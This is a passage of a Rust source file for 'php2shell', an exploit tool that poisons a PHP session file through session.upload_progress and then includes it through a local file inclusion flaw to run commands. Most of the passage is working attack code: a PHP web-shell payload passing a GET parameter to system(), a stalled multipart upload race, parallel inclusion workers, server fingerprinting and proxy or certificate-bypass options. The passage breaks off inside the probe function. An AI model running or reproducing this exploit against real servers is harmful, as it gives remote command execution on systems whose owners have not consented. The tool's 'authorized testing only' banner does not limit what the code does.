//! php2shell — PHP `session.upload_progress` → LFI → RCE
//!
//! Exploits the interaction between `PHP_SESSION_UPLOAD_PROGRESS` and an
//! arbitrary file-include sink to execute arbitrary commands.
//!
//! For authorized security testing only.

use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::{fs, process, thread};

use clap::Parser;
use native_tls::TlsConnector;
use rand::distributions::Alphanumeric;
use rand::Rng;
use reqwest::blocking::{Client as HttpClient, Response as HttpResponse};
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use reqwest::redirect::Policy as RedirectPolicy;
use serde::Serialize;
use url::Url;

const BANNER: &str = "\
+-------------------------------------------+
|  php2shell — session upload progress RCE  |
|  Authorized security testing only         |
+-------------------------------------------+";

const MAX_LFI_BODY: usize = 8 * 1024 * 1024;
const MAX_FP_BODY: usize = 64 * 1024;
const MAX_MARKER_SPAN: usize = 64 * 1024;

const DISABLED_FN_MARKERS: &[&str] = &[
    "has been disabled",
    "has been disabled for security reasons",
    "call to undefined function system",
    "call to undefined function shell_exec",
    "call to undefined function exec",
    "call to undefined function passthru",
];

// ============================================================
// CLI
// ============================================================

#[derive(Parser, Debug)]
#[command(name = "php2shell", version, about = "PHP session.upload_progress → LFI → RCE")]
struct Cli {
    /// Target base URL (http:// or https://)
    target: String,

    /// Command to execute on the target
    #[arg(short = 'c', long, default_value = "id")]
    cmd: String,

    /// GET parameter name used in payload and LFI template (%PARAM%)
    #[arg(long, default_value = "c")]
    param: String,

    /// Milliseconds to stall between upload chunks (must exceed session.upload_progress.min_freq, default 1000ms)
    #[arg(short = 's', long, default_value = "1350")]
    stall: u64,

    /// Fixed PHPSESSID (default: random per attempt)
    #[arg(long)]
    sid: Option<String>,

    /// PHPSESSID length
    #[arg(long, default_value = "26")]
    sid_length: usize,

    /// PHPSESSID charset: hex (4-bit), 5bit (default), 6bit
    #[arg(long, default_value = "5bit")]
    sid_charset: String,

    /// Session cookie name (PHP `session.name`)
    #[arg(long, default_value = "PHPSESSID")]
    session_name: String,

    /// Multipart field name that triggers session upload progress
    #[arg(long, default_value = "PHP_SESSION_UPLOAD_PROGRESS")]
    progress_field: String,

    /// Path to POST the throttled upload to (default: path from target URL)
    #[arg(long)]
    post_path: Option<String>,

    /// LFI URL template. Supports %SID%, %CMD%, %PARAM%
    #[arg(long)]
    lfi: Option<String>,

    /// Number of concurrent LFI workers used during the stall
    #[arg(long, default_value = "8")]
    lfi_workers: usize,

    /// Delay between LFI attempts per worker (ms)
    #[arg(long, default_value = "100")]
    lfi_interval: u64,

    /// Hard cap on total LFI requests across all workers
    #[arg(long, default_value = "5000")]
    lfi_max_requests: usize,

    /// Number of full end-to-end attempts (each with a fresh SID unless --sid is set)
    #[arg(long, default_value = "1")]
    retries: usize,

    /// Custom User-Agent (default: random from a small pool)
    #[arg(short = 'A', long)]
    user_agent: Option<String>,

    /// Extra cookies added to every request (session cookie is managed automatically)
    #[arg(long)]
    cookie: Option<String>,

    /// Extra header, repeatable, format "Name: Value". `Cookie:` is merged into --cookie.
    #[arg(long = "header", value_name = "K: V")]
    headers: Vec<String>,

    /// Proxy for all requests (http://host:port; socks5 only affects LFI, not the raw race socket)
    #[arg(long)]
    proxy: Option<String>,

    /// Per-request timeout (seconds)
    #[arg(long, default_value = "15")]
    timeout: u64,

    /// Skip TLS certificate verification
    #[arg(short = 'k', long)]
    insecure: bool,

    /// Build requests and print them, but do not send
    #[arg(long)]
    dry_run: bool,

    /// Skip PHP fingerprinting
    #[arg(long)]
    skip_fingerprint: bool,

    /// Verbose output
    #[arg(short = 'v', long)]
    verbose: bool,

    /// Write JSON report to FILE
    #[arg(short = 'o', long)]
    output: Option<String>,
}

// ============================================================
// Config
// ============================================================

#[derive(Clone)]
struct Config {
    target: String,
    host: String,
    port: u16,
    https: bool,
    post_path: String,
    user_agent: String,
    stall: Duration,
    timeout: Duration,
    progress_field: String,
    cmd: String,
    param: String,
    sid: String,
    sid_explicit: bool,
    sid_length: usize,
    sid_charset: SidCharset,
    session_name: String,
    insecure: bool,
    verbose: bool,
    dry_run: bool,
    lfi_template: Option<String>,
    lfi_workers: usize,
    lfi_interval: Duration,
    lfi_max_requests: usize,
    cookie: Option<String>,
    headers: Vec<String>,
    proxy: Option<String>,
    output_json: Option<String>,
    skip_fingerprint: bool,
    marker: String,
    retries: usize,
}

#[derive(Clone, Copy, Debug)]
enum SidCharset {
    Hex,
    Default5,
    SixBit,
}

impl SidCharset {
    fn chars(self) -> &'static [u8] {
        match self {
            SidCharset::Hex      => b"0123456789abcdef",
            SidCharset::Default5 => b"0123456789abcdefghijklmnopqrstuv",
            SidCharset::SixBit   => b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,-",
        }
    }
    fn parse(s: &str) -> Result<Self, String> {
        match s.to_lowercase().as_str() {
            "hex" | "4" | "4bit" => Ok(SidCharset::Hex),
            "5" | "5bit" | "default" => Ok(SidCharset::Default5),
            "6" | "6bit" => Ok(SidCharset::SixBit),
            other => Err(format!("unknown --sid-charset '{}' (use hex, 5bit, or 6bit)", other)),
        }
    }
}

// ============================================================
// Report
// ============================================================

#[derive(Serialize, Clone, Copy, Debug, PartialEq, Eq)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
enum Verdict {
    Rce,
    Poisoned,
    NoLfi,
    Crash,
    AuthRequired,
    Blocked,
    Miss,
    DryRun,
    Error,
}

#[derive(Serialize)]
struct Report {
    target: String,
    verdict: Verdict,
    attempts: usize,
    php_detected: Option<bool>,
    php_version: Option<String>,
    sid: String,
    sid_charset: String,
    session_name: String,
    stall_ms: u64,
    command: String,
    param: String,
    payload: String,
    lfi_template: Option<String>,
    race_http_status: Option<u16>,
    race_note: String,
    lfi_hits: usize,
    lfi_requests: usize,
    marker_found: bool,
    command_output: Option<String>,
    command_disabled: bool,
    notes: Vec<String>,
    error: Option<String>,
    timestamp: u64,
}

// ============================================================
// Raw HTTP response
// ============================================================

#[derive(Default)]
struct RawResponse {
    status: Option<u16>,
    body: Vec<u8>,
    set_cookie: Vec<String>,
    location: Option<String>,
    transport_error: Option<String>,
    timed_out: bool,
}

impl RawResponse {
    fn is_5xx(&self) -> bool { matches!(self.status, Some(s) if (500..600).contains(&s)) }
    fn is_2xx(&self) -> bool { matches!(self.status, Some(s) if (200..300).contains(&s)) }
    fn is_3xx(&self) -> bool { matches!(self.status, Some(s) if (300..400).contains(&s)) }
    fn indicates_crash(&self) -> bool {
        self.is_5xx() || self.timed_out || self.transport_error.is_some()
    }
}

trait ReadWrite: Read + Write {}
impl<T: Read + Write> ReadWrite for T {}

// ============================================================
// main
// ============================================================

fn main() {
    let cli = Cli::parse();
    eprintln!("{}", BANNER);

    let cfg = match build_config(cli) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[!] {}", e);
            process::exit(2);
        }
    };

    let report = run(&cfg);
    print_verdict(&report);

    if let Some(path) = &cfg.output_json {
        match serde_json::to_string_pretty(&report) {
            Ok(json) => {
                if let Err(e) = fs::write(path, json) {
                    eprintln!("[!] failed to write {}: {}", path, e);
                } else {
                    eprintln!("[*] JSON report written to {}", path);
                }
            }
            Err(e) => eprintln!("[!] failed to serialize report: {}", e),
        }
    }

    if matches!(report.verdict, Verdict::Error) {
        process::exit(1);
    }
}

fn print_verdict(r: &Report) {
    println!();
    println!("==============================================");
    println!("  VERDICT:      {:?}", r.verdict);
    println!("  Target:       {}", r.target);
    println!("  SID:          {}", r.sid);
    println!("  Attempts:     {}", r.attempts);
    if let Some(v) = &r.php_version {
        println!("  PHP version:  {}", v);
    }
    if let Some(out) = &r.command_output {
        println!("  Output:       {}", out.trim_end());
    }
    if r.command_disabled {
        println!("  NOTE:         shell function appears disabled; reported as RCE anyway");
    }
    if let Some(err) = &r.error {
        println!("  Error:        {}", err);
    }
    for n in &r.notes {
        println!("  Note:         {}", n);
    }
    println!("==============================================");
}

// ============================================================
// Orchestration
// ============================================================

fn run(cfg: &Config) -> Report {
    let mut attempts = 0usize;
    let mut last: Option<Report> = None;

    for _ in 0..cfg.retries.max(1) {
        attempts += 1;
        let mut attempt_cfg = cfg.clone();
        if attempts > 1 && !cfg.sid_explicit {
            attempt_cfg.sid = random_sid(cfg.sid_length, cfg.sid_charset);
        }
        if attempt_cfg.verbose && attempts > 1 {
            eprintln!("[*] Retry {}/{} — new SID {}", attempts, cfg.retries, attempt_cfg.sid);
        }

        let report = attempt_once(&attempt_cfg, attempts);
        if matches!(report.verdict, Verdict::Rce) {
            return report;
        }
        last = Some(report);
    }

    last.unwrap_or_else(|| error_report(cfg, attempts, "no attempts executed".into()))
}

fn attempt_once(cfg: &Config, attempt: usize) -> Report {
    let mut notes = Vec::new();

    // ---- Stage 0: fingerprint ----
    let (php_detected, php_version) = if cfg.skip_fingerprint {
        notes.push("Fingerprinting skipped (--skip-fingerprint)".into());
        (None, None)
    } else {
        match fingerprint(cfg) {
            Ok((d, v)) => (Some(d), v),
            Err(e) => {
                notes.push(format!("Fingerprint failed (proceeding): {}", e));
                (None, None)
            }
        }
    };

    if matches!(php_detected, Some(false)) {
        return build_report(
            cfg, attempt, Verdict::Miss, php_detected, php_version, None,
            "Target does not appear to be PHP".into(), 0, 0, false, None, false, notes, None,
        );
    }

    // ---- Stage 1: build payload & request ----
    let payload = build_payload(cfg);

    if cfg.stall < Duration::from_millis(1000) {
        notes.push(format!(
            "Stall {}ms is below PHP's default session.upload_progress.min_freq (1000ms); \
             the progress file may never be written",
            cfg.stall.as_millis()
        ));
    }

    match &cfg.lfi_template {
        None => notes.push(
            "No --lfi template supplied; the tool can only prove the race/crash, not command execution. \
             Provide --lfi 'http://t/page.php?file=/var/lib/php/sessions/sess_%SID%&%PARAM%=%CMD%'.".into()
        ),
        Some(tpl) => {
            if !tpl.contains("%SID%") {
                notes.push("LFI template does not contain %SID%; poisoning will not be reachable".into());
            }
            if !tpl.contains("%CMD%") {
                notes.push("LFI template does not contain %CMD%; no command will be injected".into());
            }
        }
    }

    let race_req = build_race_request(cfg, &payload);

    if cfg.verbose {
        eprintln!(
            "[*] Race request: POST {} ({} bytes total, stall {:?})",
            cfg.post_path, race_req.total_len, cfg.stall
        );
    }

    // ---- Dry run ----
    if cfg.dry_run {
        eprintln!("[dry-run] === Request line + headers ===");
        eprintln!("{}", String::from_utf8_lossy(&race_req.header_bytes));
        eprintln!(
            "[dry-run] === part1 ({} bytes), then sleep {:?} ===",
            race_req.part1_bytes.len(), cfg.stall
        );
        eprintln!("[dry-run] === part2 ({} bytes) ===", race_req.part2_bytes.len());
        eprintln!("[dry-run] === multipart body total: {} bytes ===", race_req.total_len);
        if let Some(tpl) = &cfg.lfi_template {
            eprintln!("[dry-run] LFI URL: {}", build_lfi_url(cfg, tpl));
            eprintln!(
                "[dry-run] Would spawn {} LFI workers during the stall (interval {:?}, max {} total)",
                cfg.lfi_workers, cfg.lfi_interval, cfg.lfi_max_requests
            );
        }
        return build_report(
            cfg, attempt, Verdict::DryRun, php_detected, php_version,
            None, "Dry-run: nothing sent".into(), 0, 0, false, None, false, notes, None,
        );
    }

    // ---- Stage 2: race + concurrent LFI ----
    let (race, hits, lfi_requests) = race_with_lfi(cfg, &race_req);

    if sid_was_regenerated(cfg, &race) {
        notes.push(
            "Server issued a different session id in Set-Cookie (session.use_strict_mode=1?). \
             Poisoning likely failed. Try --sid with a SID obtained from a legitimate session.".into()
        );
    }

    let race_note = if race.indicates_crash() {
        "5xx / timeout / transport error on throttled upload".to_string()
    } else if race.is_2xx() {
        "Normal response from upload endpoint".to_string()
    } else if race.is_3xx() {
        format!(
            "Redirect ({} → {}); {}",
            race.status.map(|s| s.to_string()).unwrap_or_default(),
            race.location.clone().unwrap_or_else(|| "?".into()),
            if looks_like_login(race.location.as_deref()) { "auth gate" } else { "possible WAF / gate" }
        )
    } else if let Some(e) = &race.transport_error {
        format!("Transport error: {}", e)
    } else {
        format!("HTTP status {:?}", race.status)
    };

    if cfg.verbose {
        eprintln!("[*] Race result: {}", race_note);
        eprintln!("[*] LFI fired {} requests, {} hit(s)", lfi_requests, hits.len());
    }

    // ---- Stage 3: verdict ----
    if let Some((output, disabled)) = hits.into_iter().next() {
        if disabled {
            notes.push(format!("Shell function appears disabled — output: {}", output.trim()));
        }
        return build_report(
            cfg, attempt, Verdict::Rce, php_detected, php_version, race.status,
            race_note, 1, lfi_requests, true, Some(output), disabled, notes, None,
        );
    }

    let verdict = if race.indicates_crash() {
        Verdict::Crash
    } else if race.is_3xx() && looks_like_login(race.location.as_deref()) {
        Verdict::AuthRequired
    } else if race.is_3xx() {
        Verdict::Blocked
    } else if race.is_2xx() && cfg.lfi_template.is_some() {
        Verdict::Poisoned
    } else if race.is_2xx() {
        Verdict::NoLfi
    } else {
        Verdict::Error
    };

    build_report(
        cfg, attempt, verdict, php_detected, php_version, race.status, race_note,
        0, lfi_requests, false, None, false, notes, None,
    )
}

#[allow(clippy::too_many_arguments)]
fn build_report(
    cfg: &Config,
    attempts: usize,
    verdict: Verdict,
    php_detected: Option<bool>,
    php_version: Option<String>,
    race_status: Option<u16>,
    race_note: String,
    lfi_hits: usize,
    lfi_requests: usize,
    marker_found: bool,
    command_output: Option<String>,
    command_disabled: bool,
    notes: Vec<String>,
    error: Option<String>,
) -> Report {
    Report {
        target: cfg.target.clone(),
        verdict,
        attempts,
        php_detected,
        php_version,
        sid: cfg.sid.clone(),
        sid_charset: format!("{:?}", cfg.sid_charset),
        session_name: cfg.session_name.clone(),
        stall_ms: cfg.stall.as_millis() as u64,
        command: cfg.cmd.clone(),
        param: cfg.param.clone(),
        payload: build_payload(cfg),
        lfi_template: cfg.lfi_template.clone(),
        race_http_status: race_status,
        race_note,
        lfi_hits,
        lfi_requests,
        marker_found,
        command_output,
        command_disabled,
        notes,
        error,
        timestamp: SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0),
    }
}

fn error_report(cfg: &Config, attempts: usize, err: String) -> Report {
    build_report(
        cfg, attempts, Verdict::Error, None, None, None,
        format!("Fatal: {}", err), 0, 0, false, None, false,
        vec!["Orchestration aborted before a verdict could be reached".into()],
        Some(err),
    )
}

fn build_payload(cfg: &Config) -> String {
    format!(
        r#"<?php $m="{}";echo $m;system($_GET['{}']);echo $m;?>"#,
        cfg.marker, cfg.param
    )
}

// ============================================================
// Fingerprinting
// ============================================================

fn fingerprint(cfg: &Config) -> Result<(bool, Option<String>), String> {
    let client = http_client(cfg, true)?;
    let mut php = false;
    let mut version: Option<String> = None;

    if cfg.verbose {
        eprintln!("[*] Fingerprinting {}", cfg.target);
    }

    if let Ok(resp) = client.get(&cfg.target).send() {
        if let Some(xpb) = resp.headers().get("x-powered-by") {
            let v = xpb.to_str().unwrap_or("").to_lowercase();
            if v.contains("php") {
                php = true;
                if let Some(rest) = v.split("php/").nth(1) {
                    version = Some(rest.split_whitespace().next().unwrap_or("").to_string());
                }
            }
        }
        if let Some(srv) = resp.headers().get("server") {
            if srv.to_str().unwrap_or("").to_lowercase().contains("php") {
                php = true;
            }
        }
        let cookie_hdr = cfg.session_name.to_lowercase() + "=";
        if resp.headers().get_all("set-cookie").iter().any(|v| {
            let s = v.to_str().unwrap_or("");
            s.to_lowercase().contains(&cookie_hdr) && is_php_sid(cfg, s)
        }) {
            php = true;
        }
    }

    // Body-aware fallback — never trusts status code alone.
    if !php {
        let probe = format!("{}/index.php", cfg.target.trim_end_matches('/'));
        if let Ok(mut resp) = client.get(&probe).send() {
            let mut body = Vec::new();
            let mut chunk = [0u8; 4096];
            while body.len() < MAX_FP_BODY {
                match resp.read(&mut chunk) {
                    Ok(0) => break,
                    Ok(n) => body.extend_from_slice(&chunk[..n]),
                    Err(_) => break,
                }
            }
            let text = String::from_utf8_lossy(&body).to_lowercase();
            if text.contains("x-powered-by: php")
                || text.contains("php warning")
                || text.contains("php error")
                || text.contains("php fatal error")
            {
                php = true;
            }
        }
    }

    Ok((php, version))
}

fn is_php_sid(cfg: &Config, set_cookie: &str) -> bool {
    let prefix = format!("{}=", cfg.session_name);
    let prefix_lower = prefix.to_lowercase();
    for part in set_cookie.split(';') {
        let trimmed = part.trim();
        let lower = trimmed.to_lowercase();
        if !lower.starts_with(&prefix_lower) {
            continue;
        }
        let v = trimmed[prefix.len()..].trim();
        if v.len() >= 22
            && v.len() <= 48
            && v.bytes().all(|b| b.is_ascii_alphanumeric() || b == b',' || b == b'-')
        {
            return true;
        }
    }
    false
}

// ============================================================
// HTTP client builder
// ============================================================

fn http_client(cfg: &Config, follow_redirects: bool) -> Result<HttpClient, String> {
    let mut headers = HeaderMap::new();
    for h in &cfg.headers {
        let (k, v) = h
            .split_once(':')
            .ok_or_else(|| format!("--header '{}' must be 'Name: Value'", h))?;
        let name = HeaderName::from_bytes(k.trim().as_bytes())
            .map_err(|e| format!("bad header name '{}': {}", k, e))?;
        let value = HeaderValue::from_str(v.trim())
            .map_err(|e| format!("bad header value for '{}': {}", k, e))?;
        headers.insert(name, value);
    }

    let mut b = HttpClient::builder()
        .timeout(cfg.timeout)
        .danger_accept_invalid_certs(cfg.insecure)
        .user_agent(&cfg.user_agent)
        .default_headers(headers)
        .redirect(if follow_redirects {
            RedirectPolicy::limited(3)
        } else {
            RedirectPolicy::none()
        });

    if let Some(p) = &cfg.proxy {
        b = b.proxy(reqwest::Proxy::all(p).map_err(|e| format!("bad proxy: {}", e))?);
    }
    b.build().map_err(|e| e.to_string())
}

// ============================================================
// Race request construction
// ============================================================

struct RaceRequest {
    header_bytes: Vec<u8>,
    part1_bytes: Vec<u8>,
    part2_bytes: Vec<u8>,
    total_len: usize,
}

fn build_race_request(cfg: &Config, payload: &str) -> RaceRequest {
    let boundary = format!("----WebKitFormBoundary{}", random_alnum(16));
    let filename = format!("{}.txt", random_alnum(8));

    let chunk1 = vec![b'A'; 1024];
    let chunk2 = vec![b'B'; 1024];

    let prefix = format!(
        "--{b}\r\n\
         Content-Disposition: form-data; name=\"{pf}\"\r\n\r\n\
         {pv}\r\n\
         --{b}\r\n\
         Content-Disposition: form-data; name=\"file\"; filename=\"{fn}\"\r\n\
         Content-Type: text/plain\r\n\r\n",
        b = boundary, pf = cfg.progress_field, pv = payload, fn = filename,
    )
    .into_bytes();
    let suffix = format!("\r\n--{}--\r\n", boundary).into_bytes();

    let mut part1 = prefix;
    part1.extend_from_slice(&chunk1);

    let mut part2 = chunk2;
    part2.extend_from_slice(&suffix);

    let total_len = part1.len() + part2.len();
    let cookie = build_cookie_header(cfg);

    let mut header_bytes = format!(
        "POST {path} HTTP/1.1\r\n\
         Host: {host}\r\n\
         User-Agent: {ua}\r\n\
         Accept: */*\r\n\
         Content-Type: multipart/form-data; boundary={b}\r\n\
         Content-Length: {cl}\r\n\
         Cookie: {ck}\r\n\
         Connection: close\r\n",
        path = cfg.post_path,
        host = cfg.host,
        ua = cfg.user_agent,
        b = boundary,
        cl = total_len,
        ck = cookie,
    )
    .into_bytes();

    for h in &cfg.headers {
        header_bytes.extend_from_slice(h.trim().as_bytes());
        header_bytes.extend_from_slice(b"\r\n");
    }
    header_bytes.extend_from_slice(b"\r\n");

    RaceRequest { header_bytes, part1_bytes: part1, part2_bytes: part2, total_len }
}

fn build_cookie_header(cfg: &Config) -> String {
    let mut parts: Vec<String> = Vec::new();
    if let Some(c) = &cfg.cookie {
        for p in c.split(';') {
            let p = p.trim();
            if p.is_empty() {
                continue;
            }
            let lc = p.to_lowercase();
            let prefix = format!("{}=", cfg.session_name.to_lowercase());
            if lc.starts_with(&prefix) {
                continue;
            }
            parts.push(p.to_string());
        }
    }
    parts.push(format!("{}={}", cfg.session_name, cfg.sid));
    parts.join("; ")
}

// ============================================================
// Race + concurrent LFI
// ============================================================

fn race_with_lfi(
    cfg: &Config,
    req: &RaceRequest,
) -> (RawResponse, Vec<(String, bool)>, usize) {
    let stop = Arc::new(AtomicBool::new(false));
    let found = Arc::new(AtomicBool::new(false));
    let lfi_count = Arc::new(AtomicUsize::new(0));
    let max_requests = cfg.lfi_max_requests;

    let mut workers = Vec::new();
    if let Some(tpl) = cfg.lfi_template.clone() {
        for i in 0..cfg.lfi_workers.max(1) {
            let cfg = cfg.clone();
            let stop = stop.clone();
            let found = found.clone();
            let counter = lfi_count.clone();
            let tpl = tpl.clone();
            workers.push(thread::spawn(move || -> Option<(String, bool)> {
                let client = match http_client(&cfg, false) {
                    Ok(c) => c,
                    Err(e) => {
                        eprintln!("[!] LFI worker {} failed to init client: {}", i, e);
                        return None;
                    }
                };
                let url = build_lfi_url(&cfg, &tpl);
                let mut first_logged = false;

                while !stop.load(Ordering::Relaxed) && !found.load(Ordering::Relaxed) {
                    if counter.load(Ordering::Relaxed) >= max_requests {
                        if cfg.verbose {
                            eprintln!("[*] LFI worker {} hit --lfi-max-requests cap", i);
                        }
                        break;
                    }
                    match lfi_probe(&cfg, &client, &url, &mut first_logged, i) {
                        Ok(Some(out)) => {
                            found.store(true, Ordering::Relaxed);
                            counter.fetch_add(1, Ordering::Relaxed);
                            return Some(out);
                        }
                        Ok(None) => {
                            counter.fetch_add(1, Ordering::Relaxed);
                        }
                        Err(e) => {
                            if cfg.verbose {
                                eprintln!("[!] LFI worker {}: {}", i, e);
                            }
                        }
                    }
                    thread::sleep(cfg.lfi_interval);
                }
                None
            }));
        }
    }

    let race_result = send_throttled_upload(cfg, req);

    stop.store(true, Ordering::Relaxed);
    let mut hits = Vec::new();
    for w in workers {
        match w.join() {
            Ok(Some(h)) => hits.push(h),
            Ok(None) => {}
            Err(e) => eprintln!("[!] LFI worker panicked: {:?}", e),
        }
    }

    // Never discard hits on race failure — a crash is a finding, and we may
    // have already proven RCE mid-stall.
    let race = race_result.unwrap_or_else(|e| RawResponse {
        transport_error: Some(e),
        ..Default::default()
    });
    let lfi_requests = lfi_count.load(Ordering::Relaxed);
    (race, hits, lfi_requests)
}

fn send_throttled_upload(cfg: &Config, req: &RaceRequest) -> Result<RawResponse, String> {
    let mut conn = open_connection(cfg)?;

    conn.write_all(&req.header_bytes)
        .map_err(|e| format!("write headers: {}", e))?;
    conn.write_all(&req.part1_bytes)
        .map_err(|e| format!("write part1: {}", e))?;
    conn.flush().map_err(|e| format!("flush part1: {}", e))?;
    if cfg.verbose {
        eprintln!(
            "[*] Sent {} bytes; stalling {:?} (progress file should exist now)",
            req.header_bytes.len() + req.part1_bytes.len(),
            cfg.stall
        );
    }

    thread::sleep(cfg.stall);

    conn.write_all(&req.part2_bytes)
        .map_err(|e| format!("write part2: {}", e))?;
    conn.flush().map_err(|e| format!("flush part2: {}", e))?;
    if cfg.verbose {
        eprintln!("[*] Sent {} more bytes; reading response", req.part2_bytes.len());
    }

    read_raw_response(cfg, &mut *conn)
}

// ============================================================
// Connection setup
// ============================================================

fn open_connection(cfg: &Config) -> Result<Box<dyn ReadWrite>, String> {
    let tcp = open_tcp(cfg)?;
    if cfg.https {
        let mut b = TlsConnector::builder();
        if cfg.insecure {
            b.danger_accept_invalid_certs(true);
            b.danger_accept_invalid_hostnames(true);
        }
        let tls = b
            .build()
            .map_err(|e| format!("TLS build: {}", e))?
            .connect(&cfg.host, tcp)
            .map_err(|e| format!("TLS handshake: {}", e))?;
        tls.get_ref().set_nodelay(true).ok();
        Ok(Box::new(tls))
    } else {
        Ok(Box::new(tcp))
    }
}

fn open_tcp(cfg: &Config) -> Result<TcpStream, String> {
    if let Some(proxy) = &cfg.proxy {
        return open_tcp_via_proxy(cfg, proxy);
    }

    let addr = format!("{}:{}", cfg.host, cfg.port);
    let addrs: Vec<_> = addr
        .to_socket_addrs()
        .map_err(|e| format!("resolve {}: {}", addr, e))?
        .collect();

    let mut last_err = String::from("no addresses resolved");
    for a in &addrs {
        match TcpStream::connect(a) {
            Ok(s) => {
                s.set_nodelay(true).ok();
                s.set_read_timeout(Some(cfg.timeout)).ok();
                s.set_write_timeout(Some(cfg.timeout)).ok();
                return Ok(s);
            }
            Err(e) => last_err = format!("{}", e),
        }
    }
    Err(format!("connect {}: {}", addr, last_err))
}

fn open_tcp_via_proxy(cfg: &Config, proxy: &str) -> Result<TcpStream, String> {
    let url = Url::parse(proxy).map_err(|e| format!("parse proxy '{}': {}", proxy, e))?;
    let scheme = url.scheme();
    if scheme != "http" {
        return Err(format!(
            "raw race socket only supports http:// proxies (got '{}'). \
             SOCKS works for LFI only.",
            scheme
        ));
    }
    let ph = url.host_str().ok_or("proxy URL missing host")?;
    let pp = url.port().unwrap_or(8080);

    let mut s = TcpStream::connect((ph, pp)).map_err(|e| format!("proxy connect: {}", e))?;
    s.set_nodelay(true).ok();
    s.set_read_timeout(Some(cfg.timeout)).ok();
    s.set_write_timeout(Some(cfg.timeout)).ok();

    let connect = format!(
        "CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n",
        host = cfg.host,
        port = cfg.port,
    );
    s.write_all(connect.as_bytes()).map_err(|e| e.to_string())?;

    let mut buf = Vec::new();
    let mut tmp = [0u8; 1024];
    loop {
        let n = s.read(&mut tmp).map_err(|e| format!("proxy read: {}", e))?;
        if n == 0 {
            return Err("proxy closed before CONNECT completed".into());
        }
        buf.extend_from_slice(&tmp[..n]);
        if buf.windows(4).any(|w| w == b"\r\n\r\n") {
            break;
        }
        if buf.len() > 65536 {
            return Err("proxy response too large".into());
        }
    }
    let head = String::from_utf8_lossy(&buf);
    let first = head.lines().next().unwrap_or("");
    if !first.contains(" 200 ") && !first.contains(" 200\r") {
        return Err(format!("proxy CONNECT failed: {}", first));
    }
    Ok(s)
}

// ============================================================
// Raw response reader (1xx-safe, O(n) header scan)
// ============================================================

fn read_raw_response(cfg: &Config, conn: &mut dyn ReadWrite) -> Result<RawResponse, String> {
    let mut buf = Vec::new();
    let mut tmp = [0u8; 4096];
    let deadline = Instant::now() + cfg.timeout;
    let mut timed_out = false;
    let mut transport_error: Option<String> = None;

    let mut header_end: Option<usize> = None;
    let mut content_length: Option<usize> = None;
    let mut has_te = false;
    let mut search_from = 0usize;

    loop {
        if Instant::now() >= deadline {
            timed_out = true;
            break;
        }

        if let (Some(h), Some(cl)) = (header_end, content_length) {
            if buf.len() >= h + 4 + cl {
                break;
            }
        }

        match conn.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&tmp[..n]);

                if header_end.is_none() {
                    while let Some(rel) = find_subslice(&buf[search_from..], b"\r\n\r\n") {
                        let abs = search_from + rel;
                        if parse_status_from_head(&buf[..abs])
                            .map(|s| (100..200).contains(&s))
                            .unwrap_or(false)
                        {
                            // skip 1xx block
                            search_from = abs + 4;
                            continue;
                        }
                        header_end = Some(abs);
                        let head_lower = String::from_utf8_lossy(&buf[..abs]).to_lowercase();
                        content_length = parse_content_length(&head_lower);
                        has_te = head_lower.contains("transfer-encoding:");
                        break;
                    }
                }

                if header_end.is_some() && content_length.is_none() && !has_te {
                    // no CL, no TE → rely on EOF / deadline
                }
            }
            Err(e) => {
                match e.kind() {
                    std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut => {
                        timed_out = true;
                    }
                    _ => transport_error = Some(e.to_string()),
                }
                break;
            }
        }
    }

    Ok(parse_raw_response(&buf, header_end, timed_out, transport_error))
}

fn parse_status_from_head(head: &[u8]) -> Option<u16> {
    let s = std::str::from_utf8(head).ok()?;
    s.lines().next()?.split_whitespace().nth(1)?.parse().ok()
}

fn parse_content_length(head_lower: &str) -> Option<usize> {
    head_lower.lines().find_map(|l| {
        l.strip_prefix("content-length:")
            .and_then(|v| v.trim().parse().ok())
    })
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn parse_raw_response(
    buf: &[u8],
    header_end: Option<usize>,
    timed_out: bool,
    transport_error: Option<String>,
) -> RawResponse {
    let mut r = RawResponse {
        timed_out,
        transport_error,
        ..Default::default()
    };
    let Some(h) = header_end else { return r };
    let head = String::from_utf8_lossy(&buf[..h]);
    let mut lines = head.lines();
    if let Some(status_line) = lines.next() {
        r.status = status_line.split_whitespace().nth(1).and_then(|s| s.parse().ok());
    }
    for line in lines {
        if let Some((k, v)) = line.split_once(':') {
            match k.trim().to_lowercase().as_str() {
                "set-cookie" => r.set_cookie.push(v.trim().to_string()),
                "location" => r.location = Some(v.trim().to_string()),
                _ => {}
            }
        }
    }
    r.body = buf[h + 4..].to_vec();
    r
}

// ============================================================
// Session helpers
// ============================================================

fn sid_was_regenerated(cfg: &Config, race: &RawResponse) -> bool {
    let ours = cfg.sid.as_str();
    let name_lower = cfg.session_name.to_lowercase();
    race.set_cookie.iter().any(|c| {
        c.split(';')
            .next()
            .and_then(|kv| kv.trim().split_once('='))
            .map(|(k, v)| k.to_lowercase() == name_lower && v.trim() != ours)
            .unwrap_or(false)
    })
}

fn looks_like_login(loc: Option<&str>) -> bool {
    let Some(l) = loc else { return false };
    let lower = l.to_lowercase();
    [
        "login", "signin", "sign-in", "sign_in", "auth", "session/new",
        "account/login", "wp-login", "admin/login",
    ]
    .iter()
    .any(|k| lower.contains(k))
}

// ============================================================
// LFI verification
// ============================================================

fn build_lfi_url(cfg: &Config, template: &str) -> String {
    let sid_enc = urlencoding::encode(&cfg.sid);
    let cmd_enc = urlencoding::encode(&cfg.cmd);
    let param_enc = urlencoding::encode(&cfg.param);
    template
        .replace("%SID%", &sid_enc)
        .replace("%CMD%", &cmd_enc)
        .replace("%PARAM%", &param_enc)
}

fn lfi_probe(
    cfg: &Config,
    client: &HttpClient,
    url: &str,
    first_logged: &mut bool,
    worker: usize,
